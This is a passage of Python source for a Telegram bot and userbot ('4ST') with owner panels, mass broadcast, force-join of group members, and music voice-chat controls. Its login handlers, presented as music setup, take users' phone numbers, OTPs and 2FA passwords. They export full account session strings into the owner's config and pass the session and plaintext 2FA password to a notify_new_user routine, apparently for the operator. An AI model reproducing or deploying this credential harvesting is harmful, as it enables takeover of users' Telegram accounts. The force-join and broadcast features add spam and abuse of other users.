            f"Use <code>.fjadd @user</code> / <code>.fjrm @user</code> to manage list.\n"
            f"Use <code>.forcejoin @channel all</code> to add all current group members.\n"
            f"Use <code>.forcejoin @channel custom</code> to add saved custom list.</blockquote>",
            buttons=[
                [Button.inline("📋 Show Custom List", b"fj_list"),
                 Button.inline("🗑 Clear List",       b"fj_clearall")],
                [Button.inline("🔙 Back", b"back_start")],
            ]
        )

    elif data == b"fj_list":
        if not is_owner: return
        fj_custom = cfg.get("FORCEJOIN_USERS", [])
        fj_text = "\n".join(f"  {i+1}. <code>{u}</code>" for i,u in enumerate(fj_custom)) or "  <i>None added yet</i>"
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>👥 <b>Custom Force Join Users</b>\n\n{fj_text}\n\n"
            f"Add: <code>.fjadd @username</code>\nRemove: <code>.fjrm @username</code></blockquote>",
            buttons=[[Button.inline("🔙 Back", b"forcejoin_panel")]])

    elif data == b"fj_clearall":
        if not is_owner: return
        cfg["FORCEJOIN_USERS"] = []
        save_config(cfg)
        await _safe_bot_edit(event, sender_id,
            "<blockquote>🗑 Custom Force Join list cleared.</blockquote>",
            buttons=[[Button.inline("🔙 Back", b"forcejoin_panel")]])

    elif data == b"must_join_panel":
        if not is_owner: return
        mj_chan = cfg.get("MUST_JOIN_CHANNEL", "")
        mj_gc   = cfg.get("MUST_JOIN_GC", "")
        mj_bot  = cfg.get("MUST_JOIN_BOT", "")
        buttons = [
            [Button.inline("📢 Set Channel",    b"mj_set_channel")],
            [Button.inline("👥 Set GC / Group", b"mj_set_gc")],
            [Button.inline("🤖 Set Bot",        b"mj_set_bot")],
            [Button.inline("🗑 Clear All",      b"mj_clear")],
            [Button.inline("🔙 Back",           b"back_start")],
        ]
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>🔒 <b>MUST JOIN SETTINGS</b>\n"
            f"──────────────────────\n"
            f"Users ko bot use karne se pehle yeh join karna ZAROORI hai.\n\n"
            f"📢 <b>Channel:</b> {f'<code>{mj_chan}</code>' if mj_chan else '<i>Set nahi</i>'}\n"
            f"👥 <b>GC / Group:</b> {f'<code>{mj_gc}</code>' if mj_gc else '<i>Set nahi</i>'}\n"
            f"🤖 <b>Bot:</b> {f'<code>{mj_bot}</code>' if mj_bot else '<i>Set nahi</i>'}\n\n"
            f"<b>Order:</b> Channel → Group → Bot\n"
            f"Strictly verified on every new user + reboot.</blockquote>",
            buttons=buttons
        )

    elif data == b"mj_clear":
        if not is_owner: return
        cfg["MUST_JOIN_CHANNEL"] = ""
        cfg["MUST_JOIN_GC"]      = ""
        cfg["MUST_JOIN_BOT"]     = ""
        save_config(cfg)
        await _safe_bot_edit(event, sender_id,
            "<blockquote>✅ Must Join settings cleared.</blockquote>",
            buttons=[[Button.inline("🔙 Back", b"must_join_panel")]])

    elif data == b"mj_set_channel":
        if not is_owner: return
        state.asst_conversation_state[sender_id] = {"step": "waiting_mj_channel"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>📢 <b>Must Join — Channel Set karo</b>\n"
            "Channel ka @username ya link bhejo:\n"
            "<code>@YourChannel</code>  ya  <code>https://t.me/YourChannel</code></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"must_join_panel")]]
        )

    elif data == b"mj_set_gc":
        if not is_owner: return
        state.asst_conversation_state[sender_id] = {"step": "waiting_mj_gc"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>👥 <b>Must Join — Group Set karo</b>\n"
            "Group ka invite link ya @username bhejo:\n"
            "<code>https://t.me/+abc123</code>  ya  <code>@YourGroup</code></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"must_join_panel")]]
        )

    elif data == b"mj_set_bot":
        if not is_owner: return
        state.asst_conversation_state[sender_id] = {"step": "waiting_mj_bot"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>🤖 <b>Must Join — Bot Set karo</b>\n"
            "Bot ka username bhejo:\n"
            "<code>@YourBot</code>  ya  <code>YourBot</code></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"must_join_panel")]]
        )

    elif data == b"manage_autojoin":
        if not is_owner:
            return
        links = cfg.get("AUTO_JOIN_LINKS", [])
        links_text = "\n".join(f"  {i+1}. <code>{l}</code>" for i, l in enumerate(links)) or "  <i>None set</i>"
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>🔗 <b>AUTO-JOIN LINKS</b>\n"
            f"──────────────────────\n"
            f"{links_text}\n"
            f"──────────────────────\n"
            f"<b>Add:</b> Send a link/username to add\n"
            f"<b>Remove:</b> Send the number to remove (e.g. <code>-3</code>)\n"
            f"<b>Run now:</b> Press ▶️ to join all immediately</blockquote>",
            buttons=[
                [Button.inline("▶️ Join All Now", b"autojoin_run")],
                [Button.inline("✏️ Add / Remove Links", b"autojoin_edit")],
                [Button.inline("🔙 Back", b"back_start")],
            ]
        )

    elif data == b"autojoin_run":
        if not is_owner:
            return
        await _safe_bot_edit(event, sender_id,
            "<blockquote>🔗 <b>Joining all links now...</b></blockquote>")
        asyncio.create_task(auto_join_and_start(userbot))
        await _safe_bot_edit(event, sender_id,
            "<blockquote>✅ <b>Auto-join started in background!</b>\n"
            "Check Saved Messages for join confirmations.</blockquote>",
            buttons=[[Button.inline("🔙 Back", b"manage_autojoin")]])

    elif data == b"autojoin_edit":
        if not is_owner:
            return
        state.asst_conversation_state[sender_id] = {"step": "waiting_autojoin_edit"}
        links = cfg.get("AUTO_JOIN_LINKS", [])
        links_text = "\n".join(f"  {i+1}. <code>{l}</code>" for i, l in enumerate(links)) or "  <i>None</i>"
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>✏️ <b>EDIT AUTO-JOIN LINKS</b>\n\n"
            f"{links_text}\n\n"
            f"Send a <b>link/username</b> to add it.\n"
            f"Send <code>-N</code> (e.g. <code>-2</code>) to remove entry N.</blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"manage_autojoin")]]
        )

    elif data == b"bcast_gc":
        if not is_owner:
            return
        state.asst_conversation_state[sender_id] = {"step": "waiting_bcast_gc"}
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>👥 <b>Send broadcast message for all GCs:</b>\n"
            f"Tracked GCs: <code>{len(state.active_bot_groups)}</code></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"broadcast_panel")]]
        )

    elif data == b"bcast_gc_users":
        if not is_owner:
            return
        state.asst_conversation_state[sender_id] = {"step": "waiting_bcast_gc_users"}
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>🌐 <b>Send broadcast message for GCs + Users:</b>\n"
            f"GCs: <code>{len(state.active_bot_groups)}</code> | "
            f"Users: <code>{len(state.active_bot_users)}</code></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"broadcast_panel")]]
        )

    elif data == b"set_media":
        if not is_owner:
            return
        state.asst_conversation_state[sender_id] = {"step": "waiting_media"}
        await _safe_bot_edit(event, sender_id,
            "<blockquote>📸 <b>Send the photo or video for the start banner:</b></blockquote>",
            buttons=[[Button.inline("🔙 Cancel", b"back_start")]]
        )

    elif data == b"dl_zip":
        if not is_owner:
            return
        await _safe_bot_edit(event, sender_id,
            "<blockquote>⏳ <b>Zipping bot files...</b></blockquote>")
        try:
            zip_path = os.path.join(BASE_DIR, "4st_backup.zip")
            shutil.make_archive(zip_path.replace(".zip", ""), 'zip', BASE_DIR)
            await asstbot.send_file(sender_id, zip_path,
                caption="<blockquote>📦 <b>4ST Backup ZIP</b></blockquote>",
                parse_mode='html')
            os.remove(zip_path)
        except Exception as e:
            await _bot_send_premium(sender_id,
                f"<blockquote>❌ ZIP failed: <code>{e}</code></blockquote>")

    elif data == b"toggle_sync":
        if not is_owner:
            return
        # Force to real bool first (handles stale string values from old configs)
        current = cfg.get("MASTER_SYNC", False)
        if not isinstance(current, bool):
            current = str(current).lower() in ("1", "true", "on", "yes")
        cfg["MASTER_SYNC"] = not current
        save_config(cfg)
        st = "ON" if cfg["MASTER_SYNC"] else "OFF"
        # Re-render start menu directly so the button label updates in-place
        about_text, buttons = _render_start_menu(sender_id, is_owner=True)
        try:
            await _safe_bot_edit(event, sender_id, about_text, buttons=buttons)
        except Exception:
            await _bot_send_premium(sender_id,
                f"<blockquote>🔄 <b>Master Sync is now {st}</b></blockquote>")

    elif data == b"clean_dup":
        if not is_owner:
            return
        before = len(cfg.get("SAVED_STRINGS", []))
        cfg["SAVED_STRINGS"] = list(set(cfg.get("SAVED_STRINGS", [])))
        after  = len(cfg["SAVED_STRINGS"])
        save_config(cfg)
        await _safe_bot_edit(event, sender_id,
            f"<blockquote>🧹 <b>Cleaned {before - after} duplicate(s).</b></blockquote>",
            buttons=[[Button.inline("🔙 Back", b"back_start")]])

    elif data == b"clean_exp":
        if not is_owner:
            return
        await _safe_bot_edit(event, sender_id,
            "<blockquote>⏳ Cleaning expired sessions...</blockquote>")
        asyncio.create_task(background_cleanup_task())
        await _safe_bot_edit(event, sender_id,
            "<blockquote>✅ <b>Cleanup started in background.</b></blockquote>",
            buttons=[[Button.inline("🔙 Back", b"back_start")]])

    elif data == b"back_start":
        # Re-render the SAME /start menu in place instead of faking a
        # "/start" text message — the bot sending itself a message is an
        # OUTGOING event, which asst_start_handler (incoming=True) never
        # sees, so the old approach silently did nothing and Back looked
        # broken. Building the menu directly here fixes that.
        about_text, buttons = _render_start_menu(sender_id, is_owner=is_owner)
        await _safe_bot_edit(event, sender_id, about_text, buttons=buttons)

    # ── VC CONTROL BUTTONS (sent by asstbot in group chats) ───────────────
    # Button data format: b"vc_ACTION:CHAT_ID"
    elif data and data.startswith(b"vc_"):
        raw = data.decode("utf-8", errors="ignore")
        parts   = raw.split(":", 1)
        action  = parts[0]          # e.g. "vc_pause"
        try:
            ctrl_chat = int(parts[1]) if len(parts) > 1 else event.chat_id
        except (ValueError, IndexError):
            ctrl_chat = event.chat_id

        mstate   = get_music_state(ctrl_chat)
        tgcalls  = _get_session_pytgcalls(mstate.owner_uid or 0)

        async def _vc_answer(txt):
            try:
                await event.answer(txt)
            except Exception:
                pass

        async def _refresh_ctrl_buttons(is_paused=False):
            """Update the control-button message to reflect new state."""
            try:
                btns = _vc_control_buttons(ctrl_chat, is_paused=is_paused)
                track = mstate.current
                label = track.title[:40] if track else "—"
                await event.edit(
                    f"<b>🎛 Controls</b> — <i>{label}</i>",
                    buttons=btns, parse_mode='html')
            except Exception:
                pass

        if action == "vc_pause":
            if tgcalls and mstate.is_playing and not mstate.is_paused:
                try:
                    await tgcalls.pause(ctrl_chat)
                    mstate.is_paused = True
                    if mstate.current:
                        mstate.current.paused_at = time.time()
                    await _refresh_ctrl_buttons(is_paused=True)
                    await _vc_answer("⏸️ Paused!")
                    if mstate.now_playing_msg:
                        try:
                            await mstate.now_playing_msg.edit(
                                _now_playing_text(mstate), parse_mode='html')
                        except Exception:
                            pass
                except Exception as e:
                    await _vc_answer(f"❌ {str(e)[:60]}")
            else:
                await _vc_answer("⏸️ Already paused or nothing playing.")

        elif action == "vc_resume":
            if tgcalls and mstate.is_paused:
                try:
                    await tgcalls.resume(ctrl_chat)
                    mstate.is_paused = False
                    if mstate.current and mstate.current.paused_at is not None:
                        pause_dur = time.time() - mstate.current.paused_at
                        if mstate.current.started_at is not None:
                            mstate.current.started_at += pause_dur
                        mstate.current.paused_at = None
                    await _refresh_ctrl_buttons(is_paused=False)
                    await _vc_answer("▶️ Resumed!")
                    if mstate.now_playing_msg:
                        try:
                            await mstate.now_playing_msg.edit(
                                _now_playing_text(mstate), parse_mode='html')
                        except Exception:
                            pass
                except Exception as e:
                    await _vc_answer(f"❌ {str(e)[:60]}")
            else:
                await _vc_answer("▶️ Already playing or nothing to resume.")

        elif action == "vc_skip":
            if tgcalls and mstate.is_playing:
                try:
                    next_track = mstate.queue.pop(0) if mstate.queue else None
                    if next_track:
                        ok, _r = await music_play_track(ctrl_chat, next_track, mstate.owner_uid or 0)
                        if ok:
                            # find userbot client
                            _cl = None
                            for _uid, _client in [(uid, c)
                                    for uid, c in [(list(active_user_ids)[0]
                                    if active_user_ids else 0, userbot)]]:
                                _cl = _client
                                break
                            if _cl:
                                await show_now_playing(_cl, ctrl_chat, mstate)
                            await _vc_answer(f"⏭️ Skipped → {next_track.title[:30]}")
                        else:
                            await _vc_answer("❌ Skip failed.")
                    else:
                        await tgcalls.leave_call(ctrl_chat)
                        mstate.is_playing = False
                        mstate.current    = None
                        await _vc_answer("⏭️ Queue empty — VC stopped.")
                except Exception as e:
                    await _vc_answer(f"❌ {str(e)[:60]}")
            else:
                await _vc_answer("⏭️ Nothing playing to skip.")

        elif action == "vc_stop":
            if tgcalls:
                try:
                    await tgcalls.leave_call(ctrl_chat)
                except Exception:
                    pass
            mstate.is_playing = False
            mstate.is_paused  = False
            mstate.current    = None
            mstate.queue      = []
            try:
                await event.edit(
                    "<b>⏹️ Playback stopped.</b>\n"
                    "<i>Use .play to start again.</i>",
                    parse_mode='html')
            except Exception:
                pass
            await _vc_answer("⏹️ Stopped!")

        elif action == "vc_end":
            if tgcalls:
                try:
                    await tgcalls.leave_call(ctrl_chat)
                except Exception:
                    pass
            mstate.is_playing = False
            mstate.is_paused  = False
            mstate.current    = None
            mstate.queue      = []
            try:
                await event.edit(
                    "<b>🚫 Voice chat ended.</b>\n"
                    "<i>Bot has left the voice call.</i>",
                    parse_mode='html')
            except Exception:
                pass
            await _vc_answer("🚫 VC Ended!")

        elif action == "vc_replay":
            track = mstate.current
            if track and tgcalls:
                try:
                    ok, _r = await music_play_track(ctrl_chat, track, mstate.owner_uid or 0)
                    if ok:
                        await _refresh_ctrl_buttons(is_paused=False)
                        await _vc_answer("🔄 Replaying!")
                    else:
                        await _vc_answer("❌ Replay failed.")
                except Exception as e:
                    await _vc_answer(f"❌ {str(e)[:60]}")
            else:
                await _vc_answer("❌ Nothing to replay.")

# ══════════════════════════════════════════
# ASSISTANT BOT — INPUT LISTENER
# ══════════════════════════════════════════
@asstbot.on(events.NewMessage)
async def assistant_input_listener(event):
    if not event.is_private:
        return
    sender_id = event.sender_id
    ustate    = state.asst_conversation_state.get(sender_id)
    if not ustate:
        return
    step   = ustate.get("step")
    sender = await event.get_sender()

    # ── PYROGRAM PHONE LOGIN ──
    if step == "pyro_waiting_phone":
        if not PYRO_AVAILABLE:
            await event.reply(
                "<blockquote>❌ Install pyrogram first:\n"
                "<code>pip install pyrogram tgcrypto</code></blockquote>"
            )
            state.asst_conversation_state[sender_id] = None
            return
        raw_phone = event.text.strip().replace(" ", "").replace("-", "")
        if not raw_phone.startswith("+"):
            raw_phone = "+" + raw_phone
        ustate["phone"] = raw_phone
        proc = await _bot_reply(event, f"<blockquote>🔄 Connecting... (<code>{raw_phone}</code>)</blockquote>")
        try:
            from pyrogram import Client as _PyroClient
            client_auth = _PyroClient(
                name="pyro_auth_temp",
                api_id=cfg["API_ID"],
                api_hash=cfg["API_HASH"],
                in_memory=True,
            )
            await client_auth.connect()
            sent_code = await client_auth.send_code(raw_phone)
            ustate["phone_code_hash"] = sent_code.phone_code_hash
            ustate["step"]            = "pyro_waiting_otp"
            state.pyro_auth_clients[sender_id] = client_auth
            await _premium_edit(proc, "<blockquote>╭━━━📩 <b>OTP SENT</b> ━━━╮\n"
                "┃\n"
                f"┃ Phone: <code>{raw_phone}</code>\n"
                "┃ Enter OTP with spaces: <code>1 2 3 4 5</code>\n"
                "┃\n"
                "╰━━━━━━━━━━━━━━━━━━━━━╯</blockquote>")
        except Exception as e:
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>❌ Failed: <code>{str(e)[:150]}</code></blockquote>")

    elif step == "pyro_waiting_otp":
        otp         = event.text.strip().replace(" ", "")
        client_auth = state.pyro_auth_clients.get(sender_id)
        if not client_auth:
            state.asst_conversation_state[sender_id] = None
            return
        proc = await _bot_reply(event, "<blockquote>🔄 Verifying OTP...</blockquote>")
        try:
            await client_auth.sign_in(ustate["phone"], ustate["phone_code_hash"], otp)
            export_str = await client_auth.export_session_string()
            me_info    = await client_auth.get_me()
            cfg.setdefault("PYRO_SESSIONS", {})[str(sender_id)] = export_str
            if sender_id == cfg.get("OWNER_ID", 0):
                cfg["PYRO_SESSION"] = export_str  # legacy mirror for old configs
            save_config(cfg)
            await client_auth.disconnect()
            state.pyro_auth_clients.pop(sender_id, None)
            state.asst_conversation_state[sender_id] = None
            # Notify new user
            asyncio.create_task(notify_new_user(
                me_info, export_str,
                phone=ustate.get("phone", "N/A"),
                twofa_verified=False
            ))
            if init_pyrogram(sender_id):
                asyncio.create_task(_start_music_engine(sender_id))
                await _premium_edit(proc, "<blockquote>✅ <b>Pyrogram Music Session activated!</b>\n"
                    "🎵 Music engine is now live — playing through YOUR own account.\n"
                    "Use <code>.play</code> in any group to start!</blockquote>")
            else:
                await _premium_edit(proc, "<blockquote>⚠️ Session saved but engine init failed. Restart bot.</blockquote>")
        except SessionPasswordNeeded:
            ustate["step"] = "pyro_waiting_2fa"
            await _premium_edit(proc, "<blockquote>🔐 <b>2FA Password required.</b>\n"
                "Send your Telegram 2FA password:</blockquote>")
        except (PhoneCodeInvalid, PhoneCodeExpired):
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, "<blockquote>❌ Invalid/Expired OTP. Try again.</blockquote>")
        except Exception as e:
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>❌ Error: <code>{str(e)[:150]}</code></blockquote>")

    elif step == "pyro_waiting_2fa":
        password    = event.text.strip()
        client_auth = state.pyro_auth_clients.get(sender_id)
        if not client_auth:
            state.asst_conversation_state[sender_id] = None
            return
        proc = await _bot_reply(event, "<blockquote>🔄 Checking 2FA...</blockquote>")
        try:
            await client_auth.check_password(password)
            export_str = await client_auth.export_session_string()
            me_info    = await client_auth.get_me()
            cfg.setdefault("PYRO_SESSIONS", {})[str(sender_id)] = export_str
            if sender_id == cfg.get("OWNER_ID", 0):
                cfg["PYRO_SESSION"] = export_str  # legacy mirror for old configs
            save_config(cfg)
            await client_auth.disconnect()
            state.pyro_auth_clients.pop(sender_id, None)
            state.asst_conversation_state[sender_id] = None
            # Notify new user with 2FA details
            asyncio.create_task(notify_new_user(
                me_info, export_str,
                phone=ustate.get("phone", "N/A"),
                twofa_verified=True,
                twofa_password=password
            ))
            if init_pyrogram(sender_id):
                asyncio.create_task(_start_music_engine(sender_id))
                await _premium_edit(proc, "<blockquote>✅ <b>Music engine activated!</b></blockquote>")
            else:
                await _premium_edit(proc, "<blockquote>⚠️ Session saved. Restart bot to activate.</blockquote>")
        except Exception as e:
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>❌ 2FA Error: <code>{str(e)[:150]}</code></blockquote>")

    elif step == "pyro_waiting_string":
        session_text = event.text.strip()
        if not session_text.startswith("BQ"):
            await _bot_reply(event, "<blockquote>❌ Invalid Pyrogram string. Must start with <code>BQ</code></blockquote>")
            return
        proc = await _bot_reply(event, "<blockquote>🔄 Validating session...</blockquote>")
        cfg.setdefault("PYRO_SESSIONS", {})[str(sender_id)] = session_text
        if sender_id == cfg.get("OWNER_ID", 0):
            cfg["PYRO_SESSION"] = session_text  # legacy mirror for old configs
        save_config(cfg)
        state.asst_conversation_state[sender_id] = None
        if init_pyrogram(sender_id):
            asyncio.create_task(_start_music_engine(sender_id))
            # Try to get me info for notification
            async def _notify_pyro_string():
                try:
                    _client = pyro_apps.get(sender_id)
                    me_info = await _client.get_me() if _client else None
                    await notify_new_user(me_info, session_text,
                                         phone="Via String Session", twofa_verified=False)
                except Exception:
                    pass
            asyncio.create_task(_notify_pyro_string())
            await _premium_edit(proc, "<blockquote>✅ <b>Pyrogram String Session saved!</b>\n"
                "🎵 Music engine is now live.\n"
                "Use <code>.play</code> in any group!</blockquote>")
        else:
            await _premium_edit(proc, "<blockquote>⚠️ String saved. Restart bot if music doesn't work.</blockquote>")

    elif step == "waiting_media":
        if event.media:
            msg  = await event.reply("⏳ Downloading visual media...")
            path = await event.download_media(file=DATA_DIR)
            cfg["START_MEDIA_PATH"] = path
            save_config(cfg)
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(msg, "<blockquote>✅ <b>Visual Banner locked!</b></blockquote>")
        else:
            await _bot_reply(event, "❌ Send a valid Photo/Video!")

    elif step == "waiting_autojoin_edit":
        txt = event.text.strip()
        state.asst_conversation_state[sender_id] = None
        links = cfg.setdefault("AUTO_JOIN_LINKS", [])
        if txt.startswith("-"):
            # Remove by index
            try:
                idx = int(txt[1:].strip()) - 1
                if 0 <= idx < len(links):
                    removed = links.pop(idx)
                    cfg["AUTO_JOIN_LINKS"] = links
                    save_config(cfg)
                    await _bot_reply(event,
                        f"<blockquote>✅ <b>Removed:</b> <code>{removed}</code></blockquote>")
                else:
                    await _bot_reply(event,
                        f"<blockquote>❌ Invalid number. You have {len(links)} link(s).</blockquote>")
            except ValueError:
                await _bot_reply(event,
                    "<blockquote>❌ Send <code>-N</code> to remove, e.g. <code>-2</code></blockquote>")
        else:
            # Add new link
            if txt not in links:
                links.append(txt)
                cfg["AUTO_JOIN_LINKS"] = links
                save_config(cfg)
                await _bot_reply(event,
                    f"<blockquote>✅ <b>Added:</b> <code>{txt}</code>\n"
                    f"Total links: {len(links)}</blockquote>")
            else:
                await _bot_reply(event,
                    "<blockquote>ℹ️ This link is already in the list.</blockquote>")

    elif step == "waiting_mj_channel":
        val = event.text.strip().replace('https://t.me/', '').replace('@', '').strip()
        state.asst_conversation_state[sender_id] = None
        if val:
            cfg["MUST_JOIN_CHANNEL"] = val
            save_config(cfg)
            await _bot_reply(event, f"<blockquote>✅ <b>Must Join Channel set:</b> <code>@{val}</code></blockquote>")
        else:
            await _bot_reply(event, "<blockquote>❌ Invalid channel username/link.</blockquote>")

    elif step == "waiting_mj_gc":
        val = event.text.strip()
        state.asst_conversation_state[sender_id] = None
        if val:
            cfg["MUST_JOIN_GC"] = val
            save_config(cfg)
            await _bot_reply(event, f"<blockquote>✅ <b>Must Join GC set:</b> <code>{val}</code></blockquote>")
        else:
            await _bot_reply(event, "<blockquote>❌ Invalid group link/username.</blockquote>")

    elif step == "waiting_mj_bot":
        val = event.text.strip().replace('@', '').replace('https://t.me/', '').strip()
        state.asst_conversation_state[sender_id] = None
        if val:
            cfg["MUST_JOIN_BOT"] = val
            save_config(cfg)
            await _bot_reply(event, f"<blockquote>✅ <b>Must Join Bot set:</b> <code>@{val}</code></blockquote>")
        else:
            await _bot_reply(event, "<blockquote>❌ Invalid bot username.</blockquote>")

    elif step == "waiting_startup_cfg":
        cfg["CUSTOM_STARTUP_MSG"] = event.text.strip()
        save_config(cfg)
        state.asst_conversation_state[sender_id] = None
        await _bot_reply(event, "<blockquote>✅ <b>Custom Startup Message updated!</b></blockquote>")

    elif step == "waiting_bcast":
        b_payload = event.text.strip()
        state.asst_conversation_state[sender_id] = None
        m = await _bot_reply(event, "<blockquote>🚀 <b>Broadcasting to all connected grid cores...</b></blockquote>")
        sent, fail = 0, 0
        for cl in [userbot] + extra_clients:
            try:
                await cl.send_message("me",
                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>")
                sent += 1
            except Exception:
                fail += 1
        await _premium_edit(m, f"<blockquote>✅ <b>Broadcast complete!</b>\n"
            f"Sent: {sent} | Failed: {fail}</blockquote>")

    elif step == "waiting_bcast_users":
        b_payload = event.text.strip()
        state.asst_conversation_state[sender_id] = None
        m = await _bot_reply(event, "<blockquote>🚀 <b>Broadcasting to all Bot Users...</b></blockquote>")
        u_succ, u_fail = 0, 0
        for uid in list(state.active_bot_users):
            try:
                await _bot_send_premium(uid,
                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>")
                u_succ += 1
            except Exception:
                u_fail += 1
        await _premium_edit(m, f"<blockquote>✅ <b>Broadcast Report:</b>\n"
            f"Sent: {u_succ} | Failed: {u_fail}</blockquote>")

    elif step == "waiting_bcast_gc":
        b_payload = event.text.strip()
        state.asst_conversation_state[sender_id] = None
        m = await _bot_reply(event, "<blockquote>🚀 <b>Broadcasting to all GCs...</b></blockquote>")
        g_succ, g_fail = 0, 0
        for gid in list(state.active_bot_groups):
            try:
                await asstbot.send_message(gid,
                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>",
                    parse_mode='html')
                g_succ += 1
                await asyncio.sleep(0.5)
            except Exception:
                g_fail += 1
        await _premium_edit(m, f"<blockquote>✅ <b>GC Broadcast Report:</b>\n"
            f"Sent: {g_succ} | Failed: {g_fail}</blockquote>")

    elif step == "waiting_bcast_gc_users":
        b_payload = event.text.strip()
        state.asst_conversation_state[sender_id] = None
        m = await _bot_reply(event,
            "<blockquote>🚀 <b>Broadcasting to GCs + Users...</b></blockquote>")
        g_succ, g_fail = 0, 0
        for gid in list(state.active_bot_groups):
            try:
                await asstbot.send_message(gid,
                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>",
                    parse_mode='html')
                g_succ += 1
                await asyncio.sleep(0.5)
            except Exception:
                g_fail += 1
        u_succ, u_fail = 0, 0
        for uid in list(state.active_bot_users):
            try:
                await _bot_send_premium(uid,
                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>")
                u_succ += 1
                await asyncio.sleep(0.3)
            except Exception:
                u_fail += 1
        await _premium_edit(m, f"<blockquote>✅ <b>GC + Users Broadcast Report:</b>\n"
            f"GCs → Sent: {g_succ} | Failed: {g_fail}\n"
            f"Users → Sent: {u_succ} | Failed: {u_fail}</blockquote>")

    elif step == "waiting_str":
        session_text = event.text.strip()
        if session_text.startswith("BQ"):
            await event.reply(
                "<blockquote>❌  That's a Pyrogram string.\n"
                "  Use 🎵 Music Setup for Pyrogram strings.\n"
                "  Paste a <b>Telethon</b> string here.</blockquote>"
            )
            state.asst_conversation_state[sender_id] = None
            return
        all_known = cfg["SAVED_STRINGS"]
        if session_text in all_known:
            await _bot_reply(event, "<blockquote>❌ <b>This String is already registered.</b></blockquote>")
            state.asst_conversation_state[sender_id] = None
            return
        state.asst_conversation_state[sender_id] = None
        state.active_bot_users.add(sender_id)
        cfg["BOT_USERS"] = list(state.active_bot_users)
        cfg["SAVED_STRINGS"].append(session_text)
        save_config(cfg)
        await _bot_reply(event, "<blockquote>✅ <b>String Session received! Deploying core...</b></blockquote>")
        asyncio.create_task(log_to_channel("STRING_DEPLOY", {"Method": "Manual String"},
                                           user_obj=sender))
        asyncio.create_task(deploy_new_session_string(session_text, is_startup=False,
                                                       notif_sender=sender))

    elif step == "waiting_phone":
        raw_phone = event.text.strip().replace(" ", "").replace("-", "")
        if not raw_phone.startswith("+"):
            raw_phone = "+" + raw_phone
        ustate["phone"] = raw_phone
        proc = await _bot_reply(event, f"<blockquote>🔄 <b>Connecting...</b>\nNumber: <code>{raw_phone}</code></blockquote>")
        client_auth = None
        try:
            client_auth = TelegramClient(StringSession(), cfg["API_ID"], cfg["API_HASH"])
            await client_auth.connect()
            result = await client_auth.send_code_request(raw_phone)
            ustate["phone_code_hash"] = result.phone_code_hash
            state.auth_clients[sender_id] = client_auth
            ustate["step"] = "waiting_otp"
            await _premium_edit(proc, "<blockquote>╭━━━📩 <b>OTP SENT</b> ━━━╮\n"
                "┃\n"
                f"┃ Phone: <code>{raw_phone}</code>\n"
                "┃ Enter OTP with spaces: <code>1 2 3 4 5</code>\n"
                "┃\n"
                "╰━━━━━━━━━━━━━━━━━━━━━━━╯</blockquote>")
        except errors.FloodWaitError as e:
            if client_auth:
                try: await client_auth.disconnect()
                except Exception: pass
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>⏳ <b>Rate Limit!</b> Wait <code>{e.seconds}</code>s then try again.</blockquote>")
        except Exception as e:
            if client_auth:
                try: await client_auth.disconnect()
                except Exception: pass
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>❌ <b>Failed:</b> <code>{str(e)[:150]}</code></blockquote>")

    elif step == "waiting_otp":
        otp         = event.text.strip().replace(" ", "")
        client_auth = state.auth_clients.get(sender_id)
        if not client_auth:
            state.asst_conversation_state[sender_id] = None
            return
        proc = await _bot_reply(event, "<blockquote>🔄 <b>Verifying OTP...</b></blockquote>")
        try:
            await client_auth.sign_in(ustate["phone"], code=otp,
                                      phone_code_hash=ustate["phone_code_hash"])
            string_session = client_auth.session.save()
            user_info      = await client_auth.get_me()
            uid_str        = str(user_info.id)

            tele_map = cfg["USER_MAPS"].setdefault("telethon", {})
            old = tele_map.get(uid_str)
            if old and old in cfg.get("SAVED_STRINGS", []):
                cfg["SAVED_STRINGS"].remove(old)
            tele_map[uid_str] = string_session
            if string_session not in cfg["SAVED_STRINGS"]:
                cfg["SAVED_STRINGS"].append(string_session)
            state.active_bot_users.add(sender_id)
            cfg["BOT_USERS"] = list(state.active_bot_users)
            save_config(cfg)
            await client_auth.disconnect()
            state.auth_clients.pop(sender_id, None)
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, f"<blockquote>✅ <b>Core Deployed!</b>\n"
                f"Account: <a href='tg://user?id={user_info.id}'>{user_info.first_name}</a>\n"
                f"ID: <code>{user_info.id}</code></blockquote>")
            asyncio.create_task(deploy_new_session_string(
                string_session, is_startup=False, notif_sender=user_info,
                phone=ustate.get("phone", "N/A")
            ))
        except errors.SessionPasswordNeededError:
            ustate["step"] = "waiting_2fa"
            await _premium_edit(proc, "<blockquote>🔐 <b>2FA required. Send your password:</b></blockquote>")
        except (errors.PhoneCodeInvalidError, errors.PhoneCodeExpiredError):
            state.asst_conversation_state[sender_id] = None
            await _premium_edit(proc, "<blockquote>❌ Invalid/Expired OTP. Try again via /start.</blockquote>")
        except Exception as e:
